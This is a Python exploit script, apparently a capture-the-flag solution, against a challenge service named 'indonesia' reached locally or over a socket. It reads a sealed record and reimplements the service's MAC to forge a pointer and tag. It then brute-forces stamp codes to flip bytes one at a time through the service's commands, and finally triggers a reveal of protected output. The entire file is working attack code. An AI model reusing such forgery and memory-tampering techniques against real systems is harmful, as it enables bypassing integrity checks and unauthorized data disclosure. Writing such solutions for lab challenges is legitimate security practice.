#!/usr/bin/env python3
import re
import socket
import subprocess
import sys

PROMPT = b"indonesia> "
REVEAL_DELTA_FROM_PUBLIC = 0xA0
DOC_SIZE = 0x600
SEAL_LEN = 0x18
STAMP_LIMIT = 0x30


def rol64(x, n):
    x &= 0xFFFFFFFFFFFFFFFF
    return ((x << n) | (x >> (64 - n))) & 0xFFFFFFFFFFFFFFFF


def seal_mac(a, b):
    x = (a ^ 0x243F6A8885A308D3) & 0xFFFFFFFFFFFFFFFF
    y = (b ^ 0x13198A2E03707344) & 0xFFFFFFFFFFFFFFFF
    z = (0xA4093822299F31D0 ^ (0x3A0 << 32) ^ DOC_SIZE) & 0xFFFFFFFFFFFFFFFF

    for i in range(5):
        x = (x + rol64(y ^ z, 17)) & 0xFFFFFFFFFFFFFFFF
        y = (y ^ rol64((x + 0x9E3779B97F4A7C15 + i) & 0xFFFFFFFFFFFFFFFF, 23)) & 0xFFFFFFFFFFFFFFFF
        z = (z + (rol64(y, 41) ^ x)) & 0xFFFFFFFFFFFFFFFF
        x = (x ^ rol64(z, 29)) & 0xFFFFFFFFFFFFFFFF

    return (x ^ rol64(y, 7) ^ rol64(z, 33) ^ 0x452821E638D01377) & 0xFFFFFFFFFFFFFFFF


def stamp_byte(code, off, round_no):
    x = 0x6C8E9CF5
    x ^= (code * 0x45D9F3B) & 0xFFFFFFFF
    x ^= (off * 0x119DE1F3) & 0xFFFFFFFF
    x ^= (round_no * 0x27D4EB2D) & 0xFFFFFFFF
    x &= 0xFFFFFFFF
    x = (x ^ (x >> 15)) & 0xFFFFFFFF
    x = (x * 0x2C1B3C6D) & 0xFFFFFFFF
    x = (x ^ (x >> 12)) & 0xFFFFFFFF
    x = (x * 0x297A2D39) & 0xFFFFFFFF
    x = (x ^ (x >> 15)) & 0xFFFFFFFF
    return (x ^ (x >> 8) ^ (x >> 16) ^ (x >> 24)) & 0xFF


def find_code(delta, off, round_no):
    for code in range(0x10000):
        if stamp_byte(code, off, round_no) == delta:
            return code
    raise RuntimeError(f"no code for delta={delta:#x} off={off:#x} round={round_no}")


class Tube:
    def __init__(self, argv):
        self.proc = None
        self.sock = None
        if len(argv) == 2:
            self.sock = socket.create_connection((argv[0], int(argv[1])))
            self.sock.settimeout(5)
        else:
            self.proc = subprocess.Popen(
                ["./indonesia"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                bufsize=0,
            )

    def recv(self, n=1):
        if self.sock is not None:
            return self.sock.recv(n)
        return self.proc.stdout.read(n)

    def sendall(self, data):
        if self.sock is not None:
            self.sock.sendall(data)
            return
        self.proc.stdin.write(data)
        self.proc.stdin.flush()

    def sendline(self, line):
        if isinstance(line, str):
            line = line.encode()
        self.sendall(line + b"\n")

    def recvuntil(self, needle):
        data = b""
        while not data.endswith(needle):
            chunk = self.recv(1)
            if not chunk:
                break
            data += chunk
        return data

    def recvall(self):
        data = b""
        while True:
            try:
                chunk = self.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        return data


def command(io, line):
    io.sendline(line)
    return io.recvuntil(PROMPT)


def hex_blob(output, size):
    text = output.decode(errors="replace")
    candidates = re.findall(r"(?m)^([0-9a-f]{" + str(size * 2) + r"})$", text)
    if not candidates:
        raise SystemExit("failed to parse hex blob:\n" + text)
    return bytes.fromhex(candidates[-1])


def main():
    io = Tube(sys.argv[1:])
    io.recvuntil(PROMPT)

    meta = command(io, "katalog").decode(errors="replace")
    m = re.search(r"seal_off=0x([0-9a-f]+)", meta)
    if not m:
        raise SystemExit("failed to parse katalog output:\n" + meta)
    seal_off = int(m.group(1), 16)

    first = hex_blob(command(io, f"baca {seal_off} 16"), 16)
    second = hex_blob(command(io, f"baca {seal_off + 16} 8"), 8)
    sealed = bytearray(first + second)

    slot0 = int.from_bytes(sealed[0:8], "little")
    target = slot0 + REVEAL_DELTA_FROM_PUBLIC
    target_mac = seal_mac(slot0, target)
    wanted = bytearray(sealed)
    wanted[8:16] = target.to_bytes(8, "little")
    wanted[16:24] = target_mac.to_bytes(8, "little")

    round_no = 0
    for i, (cur, want) in enumerate(zip(sealed, wanted)):
        if cur == want:
            continue
        if round_no >= STAMP_LIMIT:
            raise SystemExit("stamp budget exceeded")
        off = seal_off + i
        delta = cur ^ want
        code = find_code(delta, off, round_no)
        command(io, f"pinjam {off}")
        command(io, f"cap {code}")
        sealed[i] = want
        round_no += 1

    io.sendline("tampil 1")
    sys.stdout.buffer.write(io.recvall())


if __name__ == "__main__":
    main()
